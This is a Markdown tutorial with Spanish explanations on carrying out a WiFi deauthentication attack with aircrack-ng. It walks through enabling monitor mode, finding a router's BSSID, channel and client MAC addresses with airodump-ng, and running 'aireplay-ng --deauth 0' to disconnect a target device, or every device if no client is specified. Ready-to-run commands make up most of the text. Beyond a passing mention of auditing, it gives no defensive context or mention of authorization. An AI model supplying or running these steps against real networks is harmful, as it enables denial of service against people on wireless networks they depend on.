

# Forcing a device to disconnect from WiFi using a deauthentication attack

***A deauthentication attack is a type of attack which targets the communication between router and the device. Effectively disabling the WiFi on the device.***

> Asegurate estar como usario *root*. Ahora ejecuta el sig comando.

```bash
apt install aircrack-ng
```

>Verificar cual es nuestra interfaz con el sig comando'. 
```bash
iwconfig
```

> El sig comando se utiliza para iniciar el modo monitor en la interfaz inalámbrica especificada (en este caso, `wlan0` pero puede cambiar segun la interfaz del hardware). El modo monitor permite que la tarjeta de red capture todos los paquetes en la frecuencia seleccionada, lo cual es útil para tareas de auditoría de redes inalámbricas.**Sin comillas simples**
```bash
airmon-ng start 'wlp0s20f3'
```
> capturar y mostrar información sobre las redes inalámbricas en tu área. **Sin comillas simples**
```bash
airodump-ng 'wlan0mon'
```

> Encontrar los dispositivos que se encuentren en la red. 
> bssid: dirección MAC del router
> channel: El canal en el que opera el router.

```bash
airodump-ng wlan0mon --bssid [routers BSSID here] --channel [routers channel here]
```

### Explicacion del comando anterior.
-   `airodump-ng`: La herramienta de captura de paquetes.
-   `wlan0mon`: La interfaz inalámbrica en modo monitor.
-   `--bssid 00:11:22:33:44:55`: Filtra los paquetes para capturar solo los asociados con el BSSID especificado.
-   `--channel 6`: Limita la captura a los paquetes en el canal especificado.

Ya conociendo la MAC y el canal del dispositivo es momento de atacar 

> El comando `aireplay-ng --deauth` se utiliza para enviar paquetes de desautenticación a una red inalámbrica, lo cual puede desconectar dispositivos específicos o todos los dispositivos de esa red.
```bash
aireplay-ng --deauth 0 -c [DEVICES MAC ADDRESS] -a [ROUTERS MAC ADDRESS] wlan0mon
```
### Explicacion del comando anterior.
-   `--deauth [number of deauth packets]`: Especifica el número de paquetes de desautenticación a enviar. Usar `0` enviará paquetes de desautenticación de manera continua.
-   `-c [target device MAC address]`: La dirección MAC del dispositivo que deseas desconectar. Si no especificas esto, se intentará desconectar todos los dispositivos de la red.
-   `-a [AP MAC address]`: La dirección MAC del punto de acceso (router).
-   `[interface]`: La interfaz en modo monitor (por ejemplo, `wlan0mon`).

> [!IMPORTANT]
> Si no especificas la `-c [target device MAC address]`, se intentará desconectar todos los dispositivos de la red.

### Restablecer la Interfaz de red

```bash
airmon-ng stop 'wlan0mon'
```
Esto nos ayudara a restablcer nuesta tarjeta de red normalmente sin tener que hacer un reboot. 

#### Referencias
https://hackernoon.com/forcing-a-device-to-disconnect-from-wifi-using-a-deauthentication-attack-f664b9940142
